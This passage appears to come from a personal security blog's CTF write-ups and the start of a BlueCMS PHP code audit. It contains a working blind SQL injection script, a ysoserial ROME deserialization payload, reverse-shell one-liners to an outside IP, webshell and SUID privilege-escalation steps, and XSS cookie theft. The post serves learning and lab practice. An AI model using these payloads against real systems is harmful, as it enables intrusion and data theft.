python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ•°å­—</span></span><br><span class="line"><span class="comment">#0^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)</span></span><br><span class="line"><span class="comment">#å•å¼•å·</span></span><br><span class="line"><span class="comment">#0&#x27; or (ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SqlBlind</span>():</span><br><span class="line"></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line"><span class="comment">#wfy_admin,wfy_comments,wfy_information</span></span><br><span class="line"><span class="comment">#where(user=&#x27;f1ag_is_here&#x27;)</span></span><br><span class="line">            params=&#123;</span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;c&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;comment&#x27;:&quot;hack&quot;,</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                <span class="comment"># &#x27;name&#x27;:&quot;0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_information&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i,mid),</span></span><br><span class="line">                 <span class="string">&#x27;name&#x27;</span>:<span class="string">&quot;0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user=&#x27;f1ag_is_here&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid),</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¯·æ±‚æ–¹å¼</span></span><br><span class="line">            <span class="comment">#r=requests.get(url=url,params=params)</span></span><br><span class="line">            r=requests.post(url=url,data=params)</span><br><span class="line">            <span class="comment">#print(r.text)</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># é˜²æ­¢429</span></span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#r=requests.get(url=url2)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ç¼–ç </span></span><br><span class="line">            <span class="comment">#r=str(r.json())</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            <span class="comment"># Trueçš„æ ‡å¿—  0çš„ä¸ªæ•°</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;å¥½è€¶&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># if r.text.count(&#x27;0&#x27;)==i:</span></span><br><span class="line">                left = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line"></span><br><span class="line">            mid=(left+right)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left &lt;=<span class="number">32</span> <span class="keyword">or</span> right &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>,result)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    SqlBlind()</span><br></pre></td></tr></table></figure><h4 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/*    */</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerController</span></span><br><span class="line"><span class="comment">/*    */</span> &#123;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">/* 19 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do you like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="meta">@ResponseBody</span></span><br><span class="line"><span class="comment">/*    */</span>   <span class="keyword">public</span> String <span class="title function_">helloCTF</span><span class="params">(<span class="meta">@RequestParam</span> String EXP)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="comment">/* 24 */</span>     <span class="keyword">if</span> (EXP.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="comment">/* 25 */</span>       <span class="keyword">return</span> <span class="string">&quot;Do you know Rome Serializer?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>     &#125;</span><br><span class="line"><span class="comment">/* 27 */</span>     <span class="type">byte</span>[] exp = Base64.getDecoder().decode(EXP);</span><br><span class="line"><span class="comment">/* 28 */</span>     <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line"><span class="comment">/* 29 */</span>     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line"><span class="comment">/* 30 */</span>     objectInputStream.readObject();</span><br><span class="line"><span class="comment">/* 31 */</span>     <span class="keyword">return</span> <span class="string">&quot;Do You like Jvav?&quot;</span>;</span><br><span class="line"><span class="comment">/*    */</span>   &#125;</span><br><span class="line"><span class="comment">/*    */</span> &#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">objectInputStream.readObject();</span><br></pre></td></tr></table></figure><p>ROMEååºåˆ—åŒ–åˆ†æ</p><p><a href="https://www.yulate.com/292.html">https://www.yulate.com/292.html</a></p><blockquote><p>javaç‰ˆæœ¬è¦jdk8u-121ç…§ç€æ–‡ç« æœ¬åœ°å¤ç°äº†ï¼Œä½†æ˜¯ç”¨ysoserialå†™äº†åå¼¹shellï¼Œé¢˜ç›®çš„å‘é€è¿‡å»ä¸å¯ä»¥</p></blockquote><p>è¿™å‘¨å‘ç°åªè¦æŠŠpayloadæ‹¿å»urlç¼–ç åå°±å¯ä»¥äº†ã€‚</p><p>è¿™é‡Œæ€è€ƒäº†å¾—å‡ºçš„ç»“æœæ˜¯</p><blockquote><p>RFC3986ä¸­æŒ‡å®šäº†ä»¥ä¸‹å­—ç¬¦ä¸ºä¿ç•™å­—ç¬¦ï¼š! * â€˜ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ]</p><p>ã€€ã€€ä¸å®‰å…¨å­—ç¬¦ï¼šè¿˜æœ‰ä¸€äº›å­—ç¬¦ï¼Œå½“ä»–ä»¬ç›´æ¥æ”¾åœ¨URLä¸­çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šå¼•èµ·è§£æç¨‹åºçš„æ­§ä¹‰ã€‚è¿™äº›å­—ç¬¦è¢«è§†ä¸ºä¸å®‰å…¨å­—ç¬¦ï¼ŒåŸå› æœ‰å¾ˆå¤šã€‚</p><ul><li>ç©ºæ ¼ï¼šUrl åœ¨ä¼ è¾“çš„è¿‡ç¨‹ï¼Œæˆ–è€…ç”¨æˆ·åœ¨æ’ç‰ˆçš„è¿‡ç¨‹ï¼Œæˆ–è€…æ–‡æœ¬å¤„ç†ç¨‹åºåœ¨å¤„ç†Urlçš„è¿‡ç¨‹ï¼Œéƒ½æœ‰å¯èƒ½å¼•å…¥æ— å…³ç´§è¦çš„ç©ºæ ¼ï¼Œæˆ–è€…å°†é‚£äº›æœ‰æ„ä¹‰çš„ç©ºæ ¼ç»™å»æ‰ã€‚</li><li>å¼•å·ä»¥åŠ&lt;&gt;ï¼šå¼•å·å’Œå°–æ‹¬å·é€šå¸¸ç”¨äºåœ¨æ™®é€šæ–‡æœ¬ä¸­èµ·åˆ°åˆ†éš”Urlçš„ä½œç”¨</li><li>#ï¼šé€šå¸¸ç”¨äºè¡¨ç¤ºä¹¦ç­¾æˆ–è€…é”šç‚¹</li><li>%ï¼šç™¾åˆ†å·æœ¬èº«ç”¨ä½œå¯¹ä¸å®‰å…¨å­—ç¬¦è¿›è¡Œç¼–ç æ—¶ä½¿ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤æœ¬èº«éœ€è¦ç¼–ç </li><li>{}|^[]&#96;~ï¼šæŸä¸€äº›ç½‘å…³æˆ–è€…ä¼ è¾“ä»£ç†ä¼šç¯¡æ”¹è¿™äº›å­—ç¬¦</li></ul></blockquote><p>è€Œbase64åŠ å¯†åå¯èƒ½ä¼šå‡ºç°<code>+,/,=</code></p><p>è§£é¢˜æ­¥éª¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; 1.txt</span><br></pre></td></tr></table></figure><p>xxxä¸ºbase64åçš„<code>bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1</code></p><p>è¿™é‡Œ<code>&gt; 1.txt</code>æ˜¯å› ä¸ºå¦‚æœæˆ‘åŠ äº†<code>|base64</code>ç”Ÿæˆäº†ä¹‹åä¼šå‡ºç°å…¶ä»–ç¬¦å·</p><p><img src="/../images/image-20221018174601257-1686150281426.png" alt="image-20221018174601257"></p><p>ç”¨pythonæˆ–è€…cyberchefæ¥base64åŠ å¯†</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXP=å¯¹ä¸Šé¢ç”Ÿæˆçš„base64å†è¿›è¡Œurlç¼–ç </span><br></pre></td></tr></table></figure><p>è¿æ¥åflagåœ¨æ ¹ç›®å½•</p><p><img src="/../images/image-20221018174256886-1686150281426.png" alt="image-20221018174256886"></p><h3 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h3><h4 id="So-Baby-RCE-Again"><a href="#So-Baby-RCE-Again" class="headerlink" title="So Baby RCE Again"></a>So Baby RCE Again</h4><p>ç›´æ¥åˆ©ç”¨<code>&gt;</code>å†™å…¥æœ¨é©¬ï¼Œç„¶åä¸€å¼€å§‹ä½¿ç”¨èšå‰‘è¿æ¥</p><p>è¯»å–æ ¹ç›®å½•ä¸‹çš„start.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo $FLAG &gt; /ffll444aaggg &amp;&amp; export FLAG=not &amp;&amp; FLAG=not &amp;&amp; chmod 700 /ffll444aaggg &amp;&amp; \</span><br><span class="line">service apache2 restart &amp;&amp; \</span><br><span class="line">tail -f /dev/null</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>chmod 700 /ffll444aaggg</code>çš„æ„æ€å°±æ˜¯&#x2F;ffll444aagggåªæœ‰rootç”¨æˆ·å¯ä»¥è®¿é—®ã€‚</p><p>ç„¶åç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯ç”¨suidææƒï¼Œå› ä¸ºä¹‹å‰å“ªä¸€å‘¨çš„miscæ˜¯ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰æƒ³åˆ°çš„æ˜¯èšå‰‘çš„ç»ˆç«¯å¤ªä¸å¥½ç”¨äº†ï¼ˆå…¶å®æˆ‘ä¹‹å‰è§‰å¾—èšå‰‘æŒºå¼ºçš„ï¼Œå› ä¸ºå®ƒè‡ªå¸¦é‚£äº›ç»•è¿‡æ’ä»¶ï¼‰</p><p>æ¯”å¦‚å˜é‡èµ‹å€¼æ²¡ç”¨</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQå›¾ç‰‡20221019102635"></p><p>æŸ¥æ‰¾å…·æœ‰suidçš„å‘½ä»¤æ²¡ç”¨</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>åå¼¹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQå›¾ç‰‡20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>æ—¶é—´ç›²æ³¨</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPä»£ç å®¡è®¡</title>
      <link href="/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/05/31/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><p><input checked="" disabled="" type="checkbox"> BlueCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> SeaCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> DedeCMS</p></li><li><p><input checked="" disabled="" type="checkbox"> ThinkPHP</p></li></ul><h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><p><a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>From <a href="https://www.anquanke.com/post/id/265092#h3-5">https://www.anquanke.com/post/id/265092#h3-5</a></p><ul><li>å‡½æ•°é›†æ–‡ä»¶ï¼Œé€šå¸¸å‘½ååŒ…å«functionæˆ–è€…commonç­‰å…³é”®å­—ï¼Œè¿™äº›æ–‡ä»¶é‡Œé¢æ˜¯ä¸€äº›å…¬å…±çš„å‡½æ•°ï¼Œæä¾›å…¶ä»–æ–‡ä»¶ç»Ÿä¸€è°ƒç”¨ï¼Œæ‰€ä»¥å¤§å¤šæ•°æ–‡ä»¶éƒ½ä¼šåœ¨æ–‡ä»¶å¤´éƒ¨åŒ…å«åˆ°å…¶ä»–æ–‡ä»¶ã€‚å¯»æ‰¾è¿™äº›æ–‡ä»¶ä¸€ä¸ªéå¸¸å¥½ç”¨çš„æŠ€å·§å°±æ˜¯å»æ‰“å¼€index.phpæˆ–è€…ä¸€äº›åŠŸèƒ½æ€§æ–‡ä»¶ï¼Œåœ¨å¤´éƒ¨ä¸€èˆ¬éƒ½èƒ½æ‰¾åˆ°ã€‚</li><li>é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸å‘½åä¸­åŒ…æ‹¬configå…³é”®å­—ï¼Œé…ç½®æ–‡ä»¶åŒ…æ‹¬webç¨‹åºè¿è¡Œå¿…é¡»çš„åŠŸèƒ½æ€§é…ç½®é€‰é¡¹ä»¥åŠæ•°æ®åº“ç­‰é…ç½®ä¿¡æ¯ã€‚ä»è¿™ä¸ªæ–‡ä»¶ä¸­å¯ä»¥äº†è§£ç¨‹åºçš„å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦å¤–çœ‹è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™æ³¨æ„è§‚å¯Ÿé…ç½®æ–‡ä»¶ä¸­å‚æ•°å€¼æ˜¯å•å¼•å·è¿˜æ˜¯ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚æœæ˜¯åŒå¼•å·å¯èƒ½å°±å­˜åœ¨ä»£ç æ‰§è¡Œçš„é—®é¢˜äº†ã€‚</li><li>å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼Œå®‰å…¨è¿‡æ»¤æ–‡ä»¶å¯¹ä»£ç å®¡è®¡è‡³å…³é‡è¦ï¼Œè¿™å…³ç³»åˆ°æˆ‘ä»¬æŒ–æ˜åˆ°çš„å¯ä»¥ç‚¹èƒ½å¦ç›´æ¥åˆ©ç”¨ï¼Œé€šå¸¸å‘½åä¸­å¸¦æœ‰filterã€safeã€checkç­‰å…³é”®å­—ï¼Œè¿™ç±»æ–‡ä»¶ä¸»è¦æ˜¯å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¤§å¤šæ•°çš„åº”ç”¨å…¶å®ä¼šåœ¨å‚æ•°çš„è¾“å…¥åšä¸€ä¸‹addslashes()å‡½æ•°çš„è¿‡æ»¤ã€‚</li><li>indexæ–‡ä»¶ï¼Œindexæ˜¯ä¸€ä¸ªç¨‹åºçš„å…¥å£ï¼Œæ‰€ä»¥é€šå¸¸æˆ‘ä»¬åªè¦è¯»ä¸€è¯»indexæ–‡ä»¶å°±å¯ä»¥å¤§è‡´äº†è§£æ•´ä¸ªç¨‹åºçš„æ¶æ„ã€è¿è¡Œçš„æµç¨‹ã€åŒ…å«åˆ°çš„æ–‡ä»¶ï¼Œå…¶ä¸­æ ¸å¿ƒçš„æ–‡ä»¶æœ‰å“ªäº›ã€‚è€Œä¸åŒç›®å½•çš„indexæ–‡ä»¶ä¹Ÿæœ‰ä¸åŒçš„å®ç°æ–¹å¼ï¼Œå»ºè®®æœ€å¥½å°†å‡ ä¸ªæ ¸å¿ƒç›®å½•çš„indexæ–‡ä»¶éƒ½é€šè¯»ä¸€éã€‚</li></ul><h1 id="æ€»ç»“å¤§è‡´æµç¨‹"><a href="#æ€»ç»“å¤§è‡´æµç¨‹" class="headerlink" title="æ€»ç»“å¤§è‡´æµç¨‹"></a>æ€»ç»“å¤§è‡´æµç¨‹</h1><p><strong>1ã€å…ˆå…¨å±€æ€»è§ˆï¼šå…¥å£æ–‡ä»¶ã€è·¯ç”±ã€å…¨å±€å¤„ç†æ–¹å¼ç­‰</strong><br><strong>2ã€å®šå‘åŠŸèƒ½å®¡è®¡ï¼šé»‘ç›’(æ‰¾åˆ°æ•æ„ŸåŠŸèƒ½)+ç™½ç›’ï¼ˆå®šä½åˆ°ä»£ç è¿›è¡Œå®¡è®¡ï¼‰</strong><br><strong>3ã€æ•æ„Ÿå‡½æ•°å›æº¯</strong></p><p>å…ˆé»‘ç›’+ç™½ç›’çœ‹æ•æ„ŸåŠŸèƒ½ï¼Œå†ç”¨è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·è·‘ä¸€éå¹¶éªŒè¯ï¼Œæœ€åå†æ ¹æ®æ¼æ´å±é™©å‡½æ•°å»å›æº¯</p><h3 id="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"><a href="#è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·" class="headerlink" title="è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·"></a>è‡ªåŠ¨åŒ–å®¡è®¡å·¥å…·</h3><p>RIPS<a href="https://github.com/J0o1ey/rips-Chinese">https://github.com/J0o1ey/rips-Chinese</a></p><p>seay</p><p>Fortify</p><h1 id="bluecms"><a href="#bluecms" class="headerlink" title="bluecms"></a>bluecms</h1><h2 id="é»‘ç›’æµ‹è¯•"><a href="#é»‘ç›’æµ‹è¯•" class="headerlink" title="é»‘ç›’æµ‹è¯•"></a>é»‘ç›’æµ‹è¯•</h2><h4 id="ç”¨æˆ·æ³¨å†Œ"><a href="#ç”¨æˆ·æ³¨å†Œ" class="headerlink" title="ç”¨æˆ·æ³¨å†Œ"></a>ç”¨æˆ·æ³¨å†Œ</h4><p>åœ¨æ³¨å†Œæ—¶ï¼Œé‚®ç®±æ’å…¥xssä»£ç </p><p><img src="/../images/image-20221202120912126-1686141975680.png" alt="image-20221202120912126"></p><p><img src="/../images/image-20221202120807928-1686141975682.png" alt="image-20221202120807928"></p><p><img src="/../images/image-20221202120844185-1686141975683.png" alt="image-20221202120844185"></p><h4 id="ç”¨æˆ·å¤´åƒ"><a href="#ç”¨æˆ·å¤´åƒ" class="headerlink" title="ç”¨æˆ·å¤´åƒ"></a>ç”¨æˆ·å¤´åƒ</h4><p>ä¸Šä¼ æ–‡ä»¶ï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡åç¼€çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæœ‰ç»™å‡ºå›¾ç‰‡è·¯å¾„ï¼Œé‚£ä¹ˆä¸èƒ½é…åˆ.htaccessï¼Œéœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥åŒ…å«æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221202121559453.png" alt="image-20221202120844185"></p><h4 id="ä¿®æ”¹å¯†ç "><a href="#ä¿®æ”¹å¯†ç " class="headerlink" title="ä¿®æ”¹å¯†ç "></a>ä¿®æ”¹å¯†ç </h4><p>æ˜¯å¦å­˜åœ¨è¶Šæƒ,æµ‹è¯•äº†æ²¡æœ‰</p><h4 id="å‘å¸ƒæ–°é—»"><a href="#å‘å¸ƒæ–°é—»" class="headerlink" title="å‘å¸ƒæ–°é—»"></a>å‘å¸ƒæ–°é—»</h4><p><img src="/../images/image-20221202122851275.png" alt="image-20221202120844185"></p><p>è¿™é‡Œåˆ†ç±»é€‰æ‹©ä¸äº†ï¼Œåº”è¯¥æ˜¯è¦ç®¡ç†å‘˜å‘å¸ƒã€‚</p><h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>ç®¡ç†å‘˜</p><p><img src="/../images/image-20221202123640697-1686141975683.png" alt="image-20221202123640697"></p><p>å…¶ä»–</p><p><img src="/../images/image-20221202125147298-1686141975683.png" alt="image-20221202125147298"></p><h4 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h4><p><img src="/../images/image-20221202123831559-1686141975683.png" alt="image-20221202123831559"></p><p>è¿™é‡Œæ²¡æœ‰éªŒè¯ç éªŒè¯ï¼Œé‚£ä¹ˆå¯ä»¥å¾ˆè½»æ¾åœ°è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°usernmae&#x3D;adminï¼Œpasswd&#x3D;admin</p><p><img src="/../images/image-20221202124055555.png" alt="image-20221202120844185"></p><p>è¿›å»ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå»ºè®®ï¼Œinstallæ–‡ä»¶å¤¹ï¼Œä¸Šé¢é€šè¿‡dirsearchä¹Ÿæ‰«æå‡ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶å¤¹æ¥é‡æ–°å®‰è£…ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥é‡ç½®ç®¡ç†å‘˜äº†ï¼Œå¯æƒœæ˜¯ä¸å¯ä»¥çš„ã€‚</p><p><img src="/../images/image-20221202124235008-1686141975683.png" alt="image-20221202124235008"></p><h4 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h4><p>å‘å¸ƒæœ¬åœ°æ–°é—»è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ“ä½œï¼Œä½†æ˜¯ä¹Ÿåªèƒ½ä¸Šä¼ å›¾ç‰‡</p><p><img src="/../images/image-20221202175209000-1686141975683.png" alt="image-20221202175209000"></p><h4 id="ä¼šå‘˜ç®¡ç†"><a href="#ä¼šå‘˜ç®¡ç†" class="headerlink" title="ä¼šå‘˜ç®¡ç†"></a>ä¼šå‘˜ç®¡ç†</h4><p>å¯ä»¥å‘ç°è§¦å‘äº†ä¹‹å‰çš„xssï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ²¡æœ‰ç™»é™†ä¸Šåå°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™ä¸ªxssæ¥ğŸ£è·å–ç®¡ç†å‘˜çš„cookieã€‚</p><p><img src="/../images/image-20221202124632258-1686141975683.png" alt="image-20221202124632258"></p><p>ä¹Ÿå¯ä»¥ä¿®æ”¹ç®¡ç†å‘˜å¯†ç ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•éªŒè¯ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹ã€‚ã€‚</p><p><img src="/../images/image-20221202175052927-1686141975686.png" alt="image-20221202175052927"></p><h2 id="ç™½ç›’å®¡è®¡"><a href="#ç™½ç›’å®¡è®¡" class="headerlink" title="ç™½ç›’å®¡è®¡"></a>ç™½ç›’å®¡è®¡</h2><p>å…ˆçœ‹ä¸€ä¸‹ç›®å½•</p><p><img src="/../images/image-20221202155440394-1686141975685.png" alt="image-20221202155440394"></p><h3 id="å‰å°"><a href="#å‰å°" class="headerlink" title="å‰å°"></a>å‰å°</h3><p>å…ˆçœ‹ä¸€ä¸‹å‰å°çš„index.phpï¼Œå†…å®¹å·®ä¸å¤šå°±æ˜¯æ¸²æŸ“é¡µé¢ï¼Œæ²¡æœ‰ç”¨æˆ·å¯æ§çš„å‚æ•°ï¼Œæ‰€ä»¥å…³æ³¨å…¶åŒ…å«çš„å…¶ä»–æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221202135553953-1686141975686.png" alt="image-20221202135553953"></p><p>è·Ÿè¿›common.inc.phpçœ‹ä¸€ä¸‹</p><p>å…³é”®éƒ¨åˆ†ï¼Œç”¨æ¥éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå…¶ä¸­cookieä¸­çš„å‚æ•°æ˜¯å¯æ§çš„ã€‚</p><p><img src="/../images/image-20221202135942047-1686141975683.png" alt="image-20221202135942047"></p><p>å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦æœ‰user_idï¼Œæœ‰çš„è¯å†ç»§ç»­åˆ¤æ–­user_nameå’Œuser_pwdæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±check_cookieï¼Œå¦‚æœåªæœ‰user_nameå­˜åœ¨å°±æŸ¥è¯¢åå­—æ˜¯å¦åªæœ‰ä¸€ä¸ªï¼Œå…¶ä»–æƒ…å†µset_cookieã€‚</p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>è·Ÿè¿›check_cookie</p><p><img src="/../images/image-20221202140225964-1686141975683.png" alt="image-20221202140225964"></p><p>æŸ¥usernameå¯¹åº”çš„å¯†ç ï¼Œç»è¿‡æ•£åˆ—å¤„ç†åˆ¤æ–­å¯†ç æ˜¯å¦æ­£ç¡®ã€‚</p><p>è·Ÿè¿›getoneâ€“åœ¨include&#x2F;mysql.class.phpä¸­</p><p><img src="/../images/image-20221202140336939-1686141975683.png" alt="image-20221202140336939"></p><p><img src="/../images/image-20221202140349680-1686141975683.png" alt="image-20221202140349680"></p><p><img src="/../images/image-20221202185616902-1686141975684.png" 